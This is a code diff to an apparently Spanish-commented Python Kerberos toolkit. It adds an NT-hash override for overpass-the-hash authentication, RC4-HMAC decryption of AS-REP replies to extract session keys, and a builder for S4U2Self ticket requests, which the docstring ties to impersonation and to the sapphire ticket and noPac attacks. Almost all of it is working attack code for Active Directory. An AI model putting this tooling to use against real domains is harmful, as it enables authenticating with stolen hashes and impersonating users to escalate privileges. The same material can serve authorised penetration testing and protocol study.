@@ -717,7 +717,7 @@ def rc4_hmac_encrypt(key: bytes, plaintext: bytes, key_usage: int = 7) -> bytes:
     return confounder + ciphertext
 
 
-def build_enc_timestamp(password: str) -> bytes:
+def build_enc_timestamp(password: str, _nt_override: bytes = None) -> bytes:
     """
     Construye el PA-ENC-TIMESTAMP para un AS-REQ con pre-auth RC4-HMAC.
 
@@ -728,6 +728,10 @@ def build_enc_timestamp(password: str) -> bytes:
 
     El resultado se envuelve en EncryptedData (etype=23) y se pasa a
     build_pa_data(PA_ENC_TIMESTAMP, ...) para incluirlo en el AS-REQ.
+
+    _nt_override: si se pasa, se usa como clave directamente (bytes del NT hash)
+    en vez de computarlo a partir de password. Usado por overpass-the-hash
+    cuando se tiene el hash pero no la contraseña en claro.
     """
     now = datetime.now(timezone.utc)
 
@@ -737,7 +741,7 @@ def build_enc_timestamp(password: str) -> bytes:
         ctx_primitive(1, der_integer(now.microsecond)),
     ])
 
-    key = nt_hash(password)
+    key = _nt_override if _nt_override is not None else nt_hash(password or "")
     ciphertext = rc4_hmac_encrypt(key, ts_body, key_usage=1)
 
     # EncryptedData: { etype [0], cipher [2] }
@@ -746,3 +750,282 @@ def build_enc_timestamp(password: str) -> bytes:
         ctx_primitive(2, der_octet_string(ciphertext)),
     ])
     return enc_data
+
+
+# ============================================================
+# 6. DECRYPTION + TICKET PARSING
+# ============================================================
+
+def rc4_hmac_decrypt(key: bytes, ciphertext: bytes, key_usage: int = 8) -> bytes:
+    """
+    RC4-HMAC decryption (etype 23, MS-KILE §3.4.5.1).
+    Inversa de rc4_hmac_encrypt.
+
+    Layout del ciphertext:
+        confounder [8 bytes] + RC4(K2, checksum [16] + plaintext)
+
+    K1 = HMAC-MD5(key, usage_le32 + '\x00\x00\x00\x00')
+    K2 = HMAC-MD5(K1, confounder)
+    decrypted = RC4(K2, ciphertext[8:])
+    checksum_got = decrypted[:16]
+    plaintext   = decrypted[16:]
+    VERIFICAR: HMAC-MD5(K1, confounder + plaintext) == checksum_got
+
+    key_usage frecuentes:
+        1  = PA-ENC-TIMESTAMP (AS-REQ pre-auth)
+        7  = Authenticator en TGS-REQ
+        8  = TGS-REP enc-part (sesión cifrada con session key del TGT)
+        3  = AS-REP enc-part (cifrado con clave del usuario)
+    """
+    if len(ciphertext) < 24:
+        raise ValueError(f"Ciphertext demasiado corto: {len(ciphertext)} bytes")
+
+    confounder = ciphertext[:8]
+    encrypted_part = ciphertext[8:]
+
+    k1 = hmac_md5(key, struct.pack('<I', key_usage) + b'\x00\x00\x00\x00')
+    k2 = hmac_md5(k1, confounder)
+
+    decrypted = rc4(k2, encrypted_part)
+    checksum_got = decrypted[:16]
+    plaintext = decrypted[16:]
+
+    expected = hmac_md5(k1, confounder + plaintext)
+    if not hmac.compare_digest(checksum_got, expected):
+        raise ValueError("RC4-HMAC checksum incorrecto — clave o key_usage incorrectos")
+
+    return plaintext
+
+
+def parse_as_rep_ticket(as_rep_data: bytes) -> dict:
+    """
+    Extrae los campos principales de un AS-REP sin descifrar enc-part.
+
+    Devuelve:
+        {
+          'ticket_raw': bytes,      # el Ticket completo (APPLICATION 1) para TGS-REQ
+          'enc_part_etype': int,    # etype del enc-part (para saber cómo descifrarlo)
+          'enc_part_cipher': bytes, # ciphertext del enc-part (descifrar con hash usuario)
+        }
+
+    El enc-part del AS-REP (campo [6]) está cifrado con el hash/clave del usuario.
+    Una vez descifrado, contiene la session key y el nonce para verificar la respuesta.
+    """
+    if not is_as_rep(as_rep_data):
+        raise ValueError(f"No es AS-REP (tag=0x{as_rep_data[0]:02x})")
+
+    _, inner, _ = _der_parse_tlv(as_rep_data, 0)   # APPLICATION 11
+    _, seq_body, _ = _der_parse_tlv(inner, 0)        # SEQUENCE
+
+    ticket_raw = None
+    enc_part_etype = None
+    enc_part_cipher = None
+
+    pos = 0
+    while pos < len(seq_body):
+        ctx_tag, field_data, pos = _der_parse_tlv(seq_body, pos)
+        field_id = ctx_tag & 0x1f
+
+        if field_id == 5:   # ticket [5]
+            # El ticket está envuelto en otro APPLICATION tag, lo devolvemos raw
+            ticket_raw = field_data
+
+        elif field_id == 6:  # enc-part [6] EncryptedData
+            _, enc_seq, _ = _der_parse_tlv(field_data, 0)
+            ep = 0
+            while ep < len(enc_seq):
+                sub_tag, sub_data, ep = _der_parse_tlv(enc_seq, ep)
+                sub_id = sub_tag & 0x1f
+                if sub_id == 0:
+                    _, ib, _ = _der_parse_tlv(sub_data, 0)
+                    enc_part_etype = _parse_integer(ib)
+                elif sub_id == 2:
+                    _, ob, _ = _der_parse_tlv(sub_data, 0)
+                    enc_part_cipher = ob
+
+    return {
+        'ticket_raw': ticket_raw,
+        'enc_part_etype': enc_part_etype,
+        'enc_part_cipher': enc_part_cipher,
+    }
+
+
+def decrypt_as_rep_enc_part_rc4(as_rep_data: bytes, key: bytes) -> dict:
+    """
+    Descifra el enc-part de un AS-REP usando RC4-HMAC (etype 23).
+
+    'key' puede ser el NT hash del usuario (nt_hash(password)) o el hash
+    pasado directamente con -H.
+
+    El enc-part descifrado (EncASRepPart / EncKDCRepPart, RFC 4120 §5.4.2)
+    contiene:
+        key       [0] EncryptionKey  → session key para usar con el TGT
+        nonce     [6] UInt32
+        ...
+
+    Devuelve:
+        {
+          'session_key': bytes,     # clave de sesión (para TGS-REQ y Authenticator)
+          'session_etype': int,     # tipo de cifrado de la session key
+          'raw': bytes,             # bytes DER completos del EncKDCRepPart descifrado
+        }
+
+    Lanza ValueError si el descifrado o el checksum falla.
+    """
+    info = parse_as_rep_ticket(as_rep_data)
+    if info['enc_part_etype'] != ETYPE_RC4_HMAC:
+        raise NotImplementedError(
+            f"Solo RC4-HMAC (etype 23) implementado; el AS-REP usa etype {info['enc_part_etype']}. "
+            "Para AES256 usa impacket.krb5.crypto.Key con los helpers de aes_decrypt."
+        )
+
+    # key_usage=3 = AS-REP enc-part cifrado con clave del usuario (RFC 4120 §7.5.1)
+    plaintext = rc4_hmac_decrypt(key, info['enc_part_cipher'], key_usage=3)
+
+    # Parsear el EncKDCRepPart (APPLICATION 25 para AS-REP o 26 para TGS-REP)
+    # Lo que nos interesa es el campo key [0]:
+    # EncryptionKey ::= SEQUENCE { keytype [0] Int32, keyvalue [1] OCTET STRING }
+    session_key = None
+    session_etype = None
+
+    # El plaintext puede tener un APPLICATION wrapper (25) o solo SEQUENCE
+    start = 0
+    if plaintext[0] in (0x79, 0x7a):  # APPLICATION 25 o 26
+        _, inner, _ = _der_parse_tlv(plaintext, 0)
+        _, seq_body, _ = _der_parse_tlv(inner, 0)
+    else:
+        _, seq_body, _ = _der_parse_tlv(plaintext, 0)
+
+    pos = 0
+    while pos < len(seq_body):
+        ctx_tag, field_data, pos2 = _der_parse_tlv(seq_body, pos)
+        field_id = ctx_tag & 0x1f
+        if field_id == 0:   # key [0] EncryptionKey
+            _, enc_key_seq, _ = _der_parse_tlv(field_data, 0)
+            kp = 0
+            while kp < len(enc_key_seq):
+                kt_tag, kt_data, kp = _der_parse_tlv(enc_key_seq, kp)
+                kt_id = kt_tag & 0x1f
+                if kt_id == 0:
+                    _, ib, _ = _der_parse_tlv(kt_data, 0)
+                    session_etype = _parse_integer(ib)
+                elif kt_id == 1:
+                    _, ob, _ = _der_parse_tlv(kt_data, 0)
+                    session_key = ob
+            break
+        pos = pos2
+
+    if session_key is None:
+        raise ValueError("No se encontró session key en el EncKDCRepPart descifrado")
+
+    return {
+        'session_key': session_key,
+        'session_etype': session_etype,
+        'raw': plaintext,
+    }
+
+
+def build_s4u2self_tgs_req(
+    realm: str,
+    tgt_bytes: bytes,
+    session_key: bytes,
+    requester_user: str,
+    target_user: str,
+    requester_realm: str = None,
+    session_key_etype: int = ETYPE_RC4_HMAC,
+) -> bytes:
+    """
+    Construye un TGS-REQ con la extensión S4U2Self (RFC 4120 + MS-SFU).
+
+    S4U2Self (Service for User to Self) permite a un servicio obtener un
+    Service Ticket para sí mismo en nombre de otro usuario, sin que ese
+    usuario tenga que autenticarse. Se usa para:
+      - Delegation: el servicio puede delegar al siguiente servicio.
+      - Impersonation: base de sapphire ticket y noPac.
+
+    Diferencia respecto al TGS-REQ normal:
+      El PA-FOR-USER padata adicional (tipo 129) identifica al usuario
+      a impersonar: contiene el nombre del usuario + realm + HMAC-SHA1
+      del cuerpo firmado con la session key.
+
+    sname en S4U2Self = el SPN del propio servicio (el que pide el ticket).
+    """
+    if requester_realm is None:
+        requester_realm = realm
+
+    realm_upper = realm.upper()
+    req_realm_upper = requester_realm.upper()
+
+    now = datetime.now(timezone.utc)
+
+    # --- Authenticator ---
+    auth_body = der_sequence([
+        ctx_primitive(0, der_integer(PVNO)),
+        ctx_primitive(1, der_general_string(req_realm_upper)),
+        ctx_constructed(2, build_principal_name(KRB_NT_PRINCIPAL, requester_user)),
+        ctx_primitive(4, der_integer(now.microsecond)),
+        ctx_primitive(5, der_generalized_time(now)),
+    ])
+    authenticator_raw = application_tag(2, auth_body)
+    enc_auth = rc4_hmac_encrypt(session_key, authenticator_raw, key_usage=7)
+    enc_auth_der = der_sequence([
+        ctx_primitive(0, der_integer(session_key_etype)),
+        ctx_primitive(2, der_octet_string(enc_auth)),
+    ])
+    ap_req_body = der_sequence([
+        ctx_primitive(0, der_integer(PVNO)),
+        ctx_primitive(1, der_integer(KRB_AP_REQ)),
+        ctx_primitive(2, der_bit_string(0)),
+        ctx_constructed(3, tgt_bytes),
+        ctx_constructed(4, enc_auth_der),
+    ])
+    ap_req = application_tag(KRB_AP_REQ, ap_req_body)
+    pa_tgs = build_pa_data(PA_TGS_REQ, ap_req)
+
+    # --- PA-FOR-USER (tipo 129) — corazón de S4U2Self ---
+    # PA-FOR-USER ::= SEQUENCE {
+    #     userName   [0] PrincipalName,
+    #     userRealm  [1] Realm,
+    #     cksum      [2] Checksum,   ← HMAC-SHA1 del nombre+realm+nonce+"Kerberos"
+    #     auth-package [3] KerberosString  ← siempre "Kerberos"
+    # }
+    auth_package = b"Kerberos"
+    # checksum = HMAC-SHA1(session_key, target_user | realm | nonce | "Kerberos")
+    # donde nonce es el mismo UInt32 del req-body
+    nonce_val = random_nonce()
+    cksum_data = (target_user.encode() + realm_upper.encode() +
+                  struct.pack('<I', nonce_val) + auth_package)
+    cksum_value = hmac.new(session_key, cksum_data, hashlib.sha1).digest()
+
+    # Checksum ::= SEQUENCE { cksumtype [0] Int32, checksum [1] OCTET STRING }
+    # cksumtype 15 = HMAC-SHA1-96 (MS-SFU usa HMAC-SHA1 full, tipo -138 o 15)
+    cksum_der = der_sequence([
+        ctx_primitive(0, der_integer(15)),
+        ctx_primitive(1, der_octet_string(cksum_value)),
+    ])
+    pa_for_user_body = der_sequence([
+        ctx_constructed(0, build_principal_name(KRB_NT_PRINCIPAL, target_user)),
+        ctx_primitive(1, der_general_string(realm_upper)),
+        ctx_constructed(2, cksum_der),
+        ctx_primitive(3, der_general_string("Kerberos")),
+    ])
+    pa_for_user = build_pa_data(129, pa_for_user_body)
+
+    till = datetime.now(timezone.utc) + timedelta(days=1)
+    req_body_fields = [
+        ctx_primitive(0, der_bit_string(KDC_OPT_FORWARDABLE | KDC_OPT_RENEWABLE)),
+        ctx_primitive(2, der_general_string(realm_upper)),
+        # sname = el servicio mismo (S4U2Self pide un ticket para sí mismo)
+        ctx_constructed(3, build_principal_name(KRB_NT_PRINCIPAL, requester_user)),
+        ctx_primitive(5, der_generalized_time(till)),
+        ctx_primitive(7, der_integer(nonce_val)),
+        ctx_constructed(8, der_sequence_of([der_integer(ETYPE_RC4_HMAC)])),
+    ]
+    req_body = der_sequence(req_body_fields)
+    req_fields = [
+        ctx_primitive(1, der_integer(PVNO)),
+        ctx_primitive(2, der_integer(KRB_TGS_REQ)),
+        ctx_constructed(3, der_sequence_of([pa_tgs, pa_for_user])),
+        ctx_constructed(4, req_body),
+    ]
+    return application_tag(KRB_TGS_REQ, der_sequence(req_fields))
